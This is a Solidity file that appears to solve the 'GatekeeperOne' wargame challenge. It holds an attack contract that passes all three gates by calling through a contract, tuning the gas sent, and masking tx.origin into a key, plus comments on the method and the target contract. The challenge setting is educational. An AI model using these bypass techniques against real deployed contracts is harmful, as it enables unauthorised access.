// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import '../contracts/GatekeeperOne.sol';


contract HackGatekeeperOne {
  GatekeeperOne public originalContract;
  uint64 mask64 = 0xffffffff0000ffff;

  constructor (address contractAddress) {
    originalContract = GatekeeperOne(contractAddress);
  }

  function hack() public {
    originalContract.enter{gas: 24844}(bytes8(uint64(uint160(tx.origin) & mask64)));
  }
}


/* Solution using Remix

    First gate
      -We need to call the GatekeeperOne from another smart contract
    Second gate
      -We need to use remix in order to calculate the amount of gas when we reach the opcode
      -The opcode we need to use is the corresponding to the gas comparison
    Third gate
      -An address has 20 bytes
      -The gateKey has 8 bytes
      -One byte equals 8 uints
      -We need to use the last 2 bytes of the address (uint16)
      -Next 2 bytes need to be 0 (uint32)
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
      
      -Next 4 bytes needs to not be 0
         require(uint32(uint64(_gateKey)) != uint64(_gateKey)
      
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}